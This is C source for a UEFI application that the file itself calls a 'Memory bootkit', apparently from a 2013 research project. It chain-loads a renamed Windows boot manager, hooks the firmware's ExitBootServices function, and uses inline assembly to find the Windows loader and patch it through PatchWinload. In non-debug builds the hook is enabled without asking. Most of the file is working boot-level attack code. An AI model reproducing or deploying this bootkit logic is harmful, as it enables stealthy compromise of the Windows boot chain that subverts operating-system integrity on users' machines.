/**********************************************************************
 *  AaLl86 EFI Application Model 2013
 *	Filename: EfiMain.h
 *	Implement EFI Application Main entry point and startup functions
 *	Last revision: dd/mm/yyyy
 *
 *  Copyright© 2013 Andrea Allievi
 *	All right reserved
 **********************************************************************/

#include "stdafx.h"
#include "efimain.h"
#include "efiutils.h"

#pragma region EFI Needed protocols GUIDs & definitions
// Protocol Definition files:
#include EFI_PROTOCOL_DEFINITION (DiskIo)
#include EFI_PROTOCOL_DEFINITION (LoadedImage)
EFI_GUID efiLoadedImageGuid = EFI_LOADED_IMAGE_PROTOCOL_GUID;
EFI_GUID efiDevicePathGuid = EFI_DEVICE_PATH_PROTOCOL_GUID;
#pragma endregion

// Global EFI System table
EFI_SYSTEM_TABLE * g_pEfiTable = NULL;
// Original Efi ExitBootService function
EFI_EXIT_BOOT_SERVICES g_pOrgExitBootService = NULL;

// EFI Main entry point
EFI_STATUS EfiMain (EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE * SystemTable) 
{
	EFI_STATUS efiStatus = EFI_SUCCESS;	
	EFI_BOOT_SERVICES * eBs = SystemTable->BootServices;
	EFI_LOADED_IMAGE_PROTOCOL * pLoadedImage = NULL;				// EFI Loaded Image Protocol Struct
	g_pEfiTable = SystemTable;
	BOOLEAN enableHooks = FALSE;

	// Get Loaded Image structure from ImageHandle
	efiStatus = eBs->HandleProtocol(ImageHandle, &efiLoadedImageGuid, (LPVOID*)&pLoadedImage);
	if (EFI_ERROR(efiStatus)) {
		EfiPrint(L"Loaded Image protocol is not supported for startup Image handle.\r\n");
		// Unsupported operation
		SystemTable->BootServices->Exit(ImageHandle, EFI_LOAD_ERROR, 0, NULL);
	}
	
	// If in debug mode debug title and wait for keystroke
	#ifdef _DEBUG
	CHAR16 toDo = PrintDebugData(ImageHandle, SystemTable);
	if (toDo == L'1') enableHooks = TRUE;
	#else
	enableHooks = TRUE;
	#endif

	// HOOK ExitBootServices Function
	g_pOrgExitBootService = eBs->ExitBootServices;
	if (enableHooks) eBs->ExitBootServices = ItSecExitBootServices;

	// External Image Load 
	EFI_HANDLE hLoadedImg = NULL;
	CHAR16 * winLoader = L"\\EFI\\Microsoft\\Boot\\bootmgfw_org.efi";
	 
	efiStatus = EfiLoadImage(pLoadedImage->DeviceHandle, winLoader, &hLoadedImg, ImageHandle);

	// Now start Windows Image
	if (!EFI_ERROR(efiStatus))
		eBs->StartImage(hLoadedImg, 0, NULL);
	else
		EfiPrint(L"ItSec Memory Bootkit - Unable to start original Windows boot loader UEFI image.\r\n");

	// Terminate myself
	SystemTable->BootServices->Exit(ImageHandle, efiStatus, 4, NULL);
	return efiStatus;
}

// Print debug title information and wait for keystroke
CHAR16 PrintDebugData(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE * SystemTable) {
	EFI_STATUS efiStatus = EFI_SUCCESS;	
	if (!SystemTable) SystemTable = g_pEfiTable;
	EFI_BOOT_SERVICES * eBs = SystemTable->BootServices;
	EFI_LOADED_IMAGE_PROTOCOL * pLoadedImage = NULL;				// EFI Loaded Image Protocol Struct
	CHAR16 readChar = 0;

	// Get Loaded Image structure from ImageHandle
	efiStatus = eBs->HandleProtocol(ImageHandle, &efiLoadedImageGuid, (LPVOID*)&pLoadedImage);
	if (EFI_ERROR(efiStatus)) return efiStatus;

	EfiPrint(L"AaLl86 UEFI Memory bootkit.\r\n");
	EfiPrint(L"Press one of the following key to continue:\r\n");
	EfiPrint(L"   1. Load Os and activate memory bootkit.\r\n");
	EfiPrint(L"   2. Classicaly load OS and don't activate bootkit.\r\n");
	
	readChar = EfiReadAndWaitKey(FALSE, SystemTable);
	return readChar;
}


// New ItSec exit boot services API
EFI_STATUS ItSecExitBootServices(EFI_HANDLE ImageHandle, UINTN MapKey) {
	EFI_LOADED_IMAGE_PROTOCOL * pLoadedImage = NULL;				// EFI Loaded Image Protocol Struct
	EFI_STATUS efiStatus = EFI_SUCCESS;
	EFI_BOOT_SERVICES * eBs = NULL;

	if (!g_pEfiTable || !g_pOrgExitBootService) 
		return EFI_LOAD_ERROR;
	eBs = g_pEfiTable->BootServices;
	
	// Get Bootmgr Loaded Image structure from ImageHandle
	efiStatus = eBs->HandleProtocol(ImageHandle, &efiLoadedImageGuid, (LPVOID*)&pLoadedImage);
	// Bootmgr 32 bit Base Address returned from HandleProtocol
	// Winload 32 bit Base Address: 0x6cf000
	// This function is called from winload!OslFwpKernelSetupPhase1

	// Call original ExitBootService
	efiStatus = g_pOrgExitBootService(ImageHandle, MapKey);

	if (EFI_ERROR(efiStatus)) return efiStatus;

	LPBYTE startAddr = NULL;
	DWORD maxNumBytes = 0x100000;			// 1 MB max search 

	// Get returned address
	__asm {
		mov eax, [ebp+4]
		mov startAddr, eax;
	}

	// Now get Winload target address
	EFI_STATUS searchStatus = PatchWinload(startAddr, maxNumBytes);

	return efiStatus;
}


